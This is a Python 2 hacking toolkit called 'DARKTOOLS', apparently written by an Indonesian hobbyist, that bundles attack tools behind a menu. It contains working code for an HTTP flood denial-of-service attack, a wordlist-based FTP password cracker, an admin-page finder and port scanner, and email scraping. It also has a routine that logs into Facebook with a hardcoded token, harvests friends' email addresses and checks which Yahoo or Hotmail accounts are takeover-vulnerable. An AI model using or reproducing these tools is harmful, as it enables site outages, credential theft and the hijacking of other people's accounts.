from datetime import datetime;import random;import nmap,json,html2text,subprocess,os,sys,mechanize,requests,urllib;from time import sleep;from socket import *;from hashlib import *;from urllib2 import *;from string import *;from random import *;import re;
from modul import *
from jon import *
#import kontol
#coded by Mr.w0n63d4n
def pilih():
		pil = raw_input("menu awal(y/t): ")
		if pil == "y":
			sleep(0.5);main()
		elif pil == "t":
			sleep(0.5);raise SystemExit("\njangan lupa mampir lagi :D\n")
		else:
			print ("\nmasukin pilihanmu cuk y untuk menu\nt untuk exit tools\n");pilih()
def admin(host):
		sys.stdout.write(host + " Scanning...\r");sys.stdout.flush()
		if host.startswith("http://") or host.startswith("https://") is False:
			host = "http://" + host or "https://" + host
		for i in finder:
			target = host + "/" + i
			try:
				yop = Request(target);buka = urlopen(yop);sleep(1.5);print g + "FOUND" + k + " => " + r + target
				continue
			except URLError,HTTPError:
				print m + "NOT FOUND" + k + " => " + r + target
				continue
			except KeyboardInterrupt:
				break
		pilih()
		
def sub(host):
		if host.startswith("www.http") or host.startswith("www.https") is True:
				host = host.replace("www.http","").split("://")[1]
		try:
				subprocess.call("clear", shell = True);print ;print ("please wait process scanning " + host + "...");res = urlopen("https://www.pagesinventory.com/search/?s=www.%s"%(host)).read();regx = re.findall('<td><a href=\"\/domain\/(.*?).html\">', res)
				if not regx:
					print(p + "[" + m + "!" + p + "]" + g + "query: " + host);sleep(1);print(p + "[" + m + "!" + p + "]" + g + "nothing was found");sleep(1)
				else:
					for foran in regx:
						print (k + "=> " + g + foran);sleep(1)
		except (URLError, HTTPError) as er:
				print (p + "[" + m + "!" + p + "]" + g + "ERROR: " + str(er.reason));sleep(1)
		except KeyboardInterrupt:
				pass
		pilih()

hem = p + """
					\033[104mDARKTOOLS\033[0m\033[95m
           _________                                       
         /'        /|                                      
        /         / |_                                     
       /         /  //|                                    
      /_________/  ////|      \033[94msmart people for you | and enjoy with me\033[95m        
     |   _ _    | 8o////|                                  
     | /'// )_  |   8///|     \033[94mthanks to : Zone - Exploit | Attack Of Cyber\033[95m
     |/ // // ) |   8o///|    \033[94mthanks to : lilo ganteng for banner ASCII :v\033[95m
     / // // //,|  /  8//|                                 
    / // // /// | /   8//|                                 
   / // // ///__|/    8//|                                 
  /.(_)// /// |       8///|                                
 (_)' `(_)//| |       8////|___________                    
(_) /_\ (_)'| |        8///////////////                    
(_) \"/ (_)'|_|         8/////////////                     
 (_)._.(_) d' Hb         8oooooooopb'                      
   `(_)'  d'  H`b                                          
         d'   `b`b      \033[91mCoded by Mr.w0n63d4n\033[95m
        d'     H `b     \033[91mTesting tools please stay with me\033[95m
       d'      `b `b    \033[97mPlease support me need support from you :(\033[95m
      d'           `b   \033[97mContact WA : +628811664850\033[95m
     d'             `b\n"""
# my name is yopie rizqi maulana
# nickname me Mr.w0n63dan
# want to recoded ? may permission to me
# wa contact => +628811664850
# appreciate the work of people :)
# testing tools one in seven
def dos(host):
    subprocess.call('cls', shell = True);subprocess.call('clear', shell = True);uagent = [];uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14");uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0");uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3");uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)");uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7");uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)");uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1");bot = [];bot.append("http://www.ucshare.net/u4?channel=");bot.append("http://www.facebook.com/sharer/sharer.php?u=");bot.append("http://validator.w3.org/check?uri=")
    #Mr.w0n63d4n
    print "[*]This program will use HTTP FLOOD to dos the host.\n[*]It would work only on small websites if done only for one computer.\n[*]To take down larger websites run the attack from multiple computers.\n[*] For better performance open multiple instances of this software and attack at the same time.\n";print "[*]Host to attack: " + host;ip = socket.gethostbyname(host);print "[*]IP of the host: " + ip + "\n\n";conn = raw_input(p + "[" + b + "+" + p + "]" + g + "Enter the number of packets to be sent(depends on the site but should be more than 2000 or 3000 for average sites): ");silit = raw_input(p + "[" + b + "+" + p + "]" + g + "Enter your message: ");conn = int(conn);subprocess.call("clear", shell = True);print ("please wait process FLODDING => %s") % (host);sleep(3)
    for i in range(1,conn):
        try:    
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);s.settimeout(0.05)
        except socket.error:
            print "\033[91mERROR SERVER DOWN\033[92m"
            continue
        random_index = randrange(len(uagent));random_index2 = randrange(len(bot))
        try:
            s.connect((ip,80))
        except socket.error:
            print "\033[91mERROR SERVER DOWN\033[92m"
            continue
        print b + "[*]" + g + "Sending packet!" + k + " %d" % (i);s.send("GET / HTTP/1.1\r\n");s.send("Host: " + host + silit + "\r\n");s.send("User-Agent: " + uagent[random_index] + bot[random_index2] + "\r\n\r\n");s.close()
    pilih()
# nomer 7
def imdb(movie):
    subprocess.call('cls', shell = True);subprocess.call('clear', shell = True);print "[*] Accessing IMDB database...\n";m = urlopen('http://www.imdb.com/find?ref_=nv_sr_fn&q=' + movie.replace(' ','+') + '&s=all');m = m.read()
    for i in m.split('\n'):
        if "result_text" in i:
            if "/title/" in i:
                if "/title/" in i.split('href=')[1].split('>')[0].strip("\"").split("?ref")[0]:
                    link = "http://www.imdb.com" + i.split('href=')[1].split('>')[0].strip("\"").split("?ref")[0]
                
    url = urlopen(str(link))
    for line in url.read().split('\n'):
        if 'strong title' in line:
            print line.split('title=')[1].split(">")[0]
    pilih()
#hobbies are weapons that people use
#to do things that seem impossible in
#the field they like
#greetings from me Mr.w0n63d4n
# nomer 1
def scanner(host):
		global wongedan;subprocess.call('clear', shell=True)
		if os.name == 'nt':
			os.system('cls')
		else:
			os.system('clear')
		print g + "*******************************************";print g + "************Simple Port Scanner************";print g + "*******************************************"
		if __name__ == '__main__':
			port1 = input("scan port from: ");port2 = input("to: ");targetIP = socket.gethostbyname(host);print g + 'Ready to scan :v ', targetIP;print g + "please wait proccess scanning %s..." % (host);sleep(4)
    		#scan reserved ports
			daftar = [80,8080,443,143,20,21,22,23,53,119,137,139,161,162,389,1433,1434,3306,1521,1522,1525,1529,1494,1604,]
			#wongedan
			for i in range(port1,port2):
				#kentir
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);s.settimeout(0.05);result = s.connect_ex((targetIP, i))
				if(result == 0):
					print ('\033[94mPort \033[93m%d: \033[92mOPEN' % (i))
				else:
					print ('\033[94mport \033[93m%d: \033[91mCLOSED' % (i))
				s.close()
		print g + '***********************************************';print g + "Scanning finished";print g + '***********************************************'
		pilih()
# nomer 6
def email(host):
    subprocess.call('cls', shell = True);subprocess.call('clear', shell = True);print"[*] Email addresses found on page: "
    try:
        e = urlopen('http://' + str(host))
    except:
        print "Error"
    try:
        e = urlopen('http://' + str(host))
    except:
        print "Error"
    try:
        cont = html2text.html2text(e.read())
    except UnicodeDecodeError:
        try:
            cont = html2text.html2text(urlopen('http://' + str(host)).read().decode('utf-8'))
        except :
            cont = urlopen('http://' + str(host)).read()
    cont = cont.split('\n')
    for line in cont:
        if '@' in line:
            print line
        else:
            print(p + "[" + m + "!" + p + "]" + g + "not email in domain !")
            pass
    pilih()
    
def banner(host):
    subprocess.call('cls', shell = True);subprocess.call('clear', shell = True)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except:
        print "Error"
    host = socket.gethostbyname(host);port = raw_input(p + "[" + b + "*" + p + "]" + g + " Enter the port of the service: ")
    try:
        s.connect((host,int(port)));print p + "[" + b + "*" + p + "]" + g + " connection successfull\nWaiting for the banner...\n";sleep(2)
        if int(port) == 80:
            s.send('HEAD / HTTP/1.0\r\n\r\n')
        data = s.recv(1024);print "\headers:\n" + str(data);s.close()
    except:
        print p + "[" + m + "!" + p + "]" + g + "Connection failed"
    pilih()
# nomer 5
def ftp(server):
    subprocess.call('cls', shell = True);subprocess.call('clear', shell = True);print "[*]Put the password file in the same directory.\n[*]The passwords should be on different lines.\n";password = []
    passw = raw_input("[+] Enter the password file name(eg: pass.txt, wordlist.txt): ")
    username = raw_input("[+] Enter the username to hack(eg: admin, root): ") 
    f = open(str(passw));f = f.read();f = f.split('\n')
    for i in f:
        password.append(str(i))
    server = socket.gethostbyname(server)
    for password in password:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        except:
            print "Unable to create Socket."
            main()
        try:
            s.connect((server,21))
        except:
            print "Unable To Connect."
            main()
        data = s.recv(1024);
        s.send('USER ' +username+ '\r\n');
        data = s.recv(1024);
        s.send('PASS ' +password+'\r\n');
        print data;data += " "+s.recv(1024);
        data += " "+s.recv(1024);
        s.send("Quit\r\n");
        s.close;print "[*] Tried: " + password + "\n"
        if "230" in data:
            print "password found\n";print "[*] Password is: " + password
            main()
        else:
            print '[*] ' + password + " is incorrect"
    print "No password Found. Try another word list or username."
    pilih()
    
def spider(host):
    subprocess.call('cls', shell = True);subprocess.call('clear', shell = True);print "[*] Use the result to find promising URLs to try hacking using SQL injection or Xss etc.\n[*] Depth is the level to go inside the website( between 10-20 is enough usually but depends on you).\n[*] Output will also be saved in text files in the same folder as this software.\n";depth = raw_input("Enter the depth level in numbers: ");count = 1;url = "http://" + host;text = open("depth1.txt","w+")
    for i in re.findall('''href=["'](.[^"']+)["']''', urlopen(url).read(), re.I):
        if "http" not in i:
		    i = "http://" + host + i
        print i
        text.write(i + '\n')
    text.close()
    while(count <= int(depth)):
        text = open("depth" + str(count) + ".txt", "r");text1 = open("depth" + str(count + 1) + ".txt", "w+")
        if text.read() == "":
            print "\n****Finished****"
            main()
        f = text.read().split("\n")
        for j in f:
            if "http" not in j:
                j = "http://" + host + j

            for k in re.findall('''href=["'](.[^"']+)["']''', urlopen(j).read(), re.I):
                print k
                text1.write(k + "\n")
        text.close();text1.close()		
        count += 1
    pilih()
# nomer 8
def cobra():
    subprocess.call("clear", shell = True);
    reload(sys);
    sys.setdefaultencoding('utf8');
    br = mechanize.Browser();
    y = (g + "-" * 50)
    yopie = (y + p + "\nAuthor :" + g + " Mr.w0n63d4n\n" + r + p + "Github :" + g + " https://github.com/wongedan123\n" + r + p + "Contact wa :" + g + " +628811664850\n" + y + p + "\nLogin fb your account\n" + r);
    br.set_handle_robots(False);
    os.system("clear")
    print yopie
    idt = raw_input(p + "[" + g + "*" + p + "]" + k + " Username/Email\033[0m : " + g);
    passw = raw_input(p + "[" + g + "*" + p + "]" + k + " Password\033[0m : " + g)
    url = "https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + (idt) + "&locale=en_US&password=" + (passw) + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6";
    data = urllib.urlopen(url);
    op = json.load(data)
    if 'access_token' in op:
    	token = (op["access_token"]);
    	print (p + "[" + b + "+" + p + "]" + g + " Login successfull")
    else:
    	print (p + "[" + m + "!" + p + "]" + m + " Login failed coba cek connection kamu atau cek fb barangkali dapat security ganti sandi!" + r)
    	pilih()
    get_friends = requests.get('https://graph.facebook.com/me/friends?access_token='+token);
    hasil = json.loads(get_friends.text);
    print (p + "[" + g + "+" + p + "]" + g + " managed to get your friend ID..." + r)
    global putri, bella
    putri = []
    bella = 0
    print g + 57*"-";
    print g + "| " + 12*" " + k + "Email" + 14*" " + g + "|" + 9*" " + k + "Cek!" + 9*" " + g + "|";
    print g + 57*"-"
    for i in hasil['data']:
        wrna = "\033[32m";
        wrne = "\033[39m";
        bella += 1;
        putri.append(bella);
        x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+token);
        y = json.loads(x.text)
        try:
            kunci = re.compile(r'@.*')
            cari = kunci.search(y['email']).group()
            if 'yahoo.com' in cari:
                br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com");
                br._factory.is_html = True;
                br.select_form(nr=0);
                br["username"] = y['email'];
                j = br.submit().read()
                Wong = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
                try:
                    cd = Wong.search(j).group()
                except:
                    vuln = 6*" " + m + "Not Vuln";
                    free = 30 - (len(y['email']));
                    pck = free * " ";
                    rizky = 24 - (len(vuln));
                    code = rizky * " ";
                    print g + "[ " + k + y['email'] + pck + g + "]-[ " + wrne + vuln + code + g + " ]"
                    continue
                if '"messages.ERROR_INVALID_USERNAME">' in cd:
                	vuln = 8*" " + g + "Vuln"
                else:
                	vuln = 5*" " + m + "Not Vuln"
                	free = 30 - (len(y['email']));
                	pck = free * " ";
                	rizky = 24 - (len(vuln));
                	code = rizky * " ";
                	print g + "[ " + k + y['email'] + pck + g + "]-[ " + wrne + vuln + code + g + " ]"
            elif 'hotmail' in cari:
                url = ("http://apilayer.net/api/check?access_key=7a58ece2d10e54d09e93b71379677dbb&email=" + y['email'] + "&smtp=1&format=1");
                cek = json.loads(requests.get(url).text)
                if cek['smtp_check'] == 0:
                	vuln = 8*" " + g + "Vuln"
                else:
                	vuln = 5*" " + m + "Not Vuln"
                	free = 30 - (len(y['email']));
                	pck = free * " ";
                	rizky = 24 - (len(vuln));
                	code = rizky * " ";
                	print g + "[ " + g + y['email'] + pck + g + "]-[ " + wrne + vuln + code + g + " ]"
            else:
                pass
        except KeyError:
            pass
    cobra()
    pilih()

def main():
    lilo_stres;sleep(2);subprocess.call("clear", shell=True);print hem
    print m + "[" + p + "01" + m + "]" + g + ".Port Scanning" + "                " + m + "[" + p + "11" + m + "]" + g + ".Admin finder" + r;
    print m + "[" + p + "02" + m + "]" + g + ".DDOS" + "                         " + m + "[" + p + "12" + m + "]" + g + ".cari no whatsapp" + r;
    print m + "[" + p + "03" + m + "]" + g + ".HTTP headers" + "                 " + m + "[" + p + "13" + m + "]" + g + ".hash password" + r
    print m + "[" + p + "04" + m + "]" + g + ".infor all URLs for hacking" + "   " + m + "[" + p + "14" + m + "]" + g + ".Tools installer AOC" + r;
    print m + "[" + p + "05" + m + "]" + g + ".FTP Password Cracker" + "         " + m + "[" + p + "15" + m + "]" + g + ".compile marshal file python" + r;
    print m + "[" + p + "06" + m + "]" + g + ".Email Scraping" + "               " + m + "[" + p + "16" + m + "]" + g + ".Deface Creator" + r
    print m + "[" + p + "07" + m + "]" + g + ".IMDB Rating" + r
    print m + "[" + p + "08" + m + "]" + g + ".Vuln yahoo for Fb" + r
    print m + "[" + p + "09" + m + "]" + g + ".Exit tools" + r 
    print m + "[" + p + "10" + m + "]" + g + ".subdomain scanner\n" + r
    choice = raw_input(p + "[" + b + "+" + p + "]" + g + " Enter Your Choice: ")
    if choice == '9' or choice == '09' or choice == 'sembilan':
    	sleep(1);subprocess.call("clear", shell = True);raise SystemExit("\nterimkasih sudah berkunjung :')\n")
    	pass
    if choice == '12' or choice == 'duabelas':
        wa()
    if choice == '16' or choice == 'enambelas':
        depes()
    if choice == '15' or choice == 'limabelas':
        import gua_cans
    if choice == '14' or choice == 'empatbelas':
        tegal()
    if choice == '13' or choice == 'tigbelas':
        hashing()
    if choice == '8' or choice == '08' or choice == 'delapan':
        cobra()
    if choice == '11' or choice == 'sebelas' or choice == '1' or choice == '01' or choice == 'satu' or choice == '2' or choice == '02' or choice == 'dua' or choice == '3' or choice == '03' or choice == 'tiga' or choice == '4' or choice == '04' or choice == 'empat' or choice == '5' or choice == '05' or choice == 'lima' or choice == '6' or choice == '06' or choice == 'enam' or choice == '10' or choice == 'sepuluh':
    	print "";subprocess.call("clear", shell = True);print ""
    	#pilihan nomer 1
    	wongedan = raw_input("masukan site/host target: ")
    	if choice == '1' or choice == '01' or choice == 'satu':
        	scanner(wongedan)
    	elif choice == '11' or choice == 'sebelas':
    	    admin(wongedan)
    	elif choice == '6' or choice == '06' or choice == 'enam':
        	email(wongedan)
    	elif choice == '3' or choice == '03' or choice == 'tiga':
        	banner(wongedan)
    	elif choice == '2' or choice == '02' or choice == 'dua':
        	dos(wongedan)
    	elif choice == '5' or choice == '05' or choice == 'lima':
        	ftp(wongedan)
    	elif choice == '4' or choice == '04' or choice == 'empat':
    	    spider(wongedan)
    	elif choice == '10' or choice == 'sepuluh':
        	sub(wongedan)
    	else:
    		subprocess.call("clear", shell = True);print ("\n\nbelum masukan pilihan bos!\n\n")
    		pass
    #pilihan nomer 2
    if choice == '7' or choice == '07' or choice == 'tujuh':
    	subprocess.call("clear", shell = True);hostname = raw_input("\n\nmasukan judul film contoh(The flash,Superman, Dll): ")
    	if choice == '7' or choice == '07' or choice == 'tujuh':
        	imdb(hostname)
#    else:
#    	print (pilih())
#    	pass
if __name__ == '__main__':
    main()
    
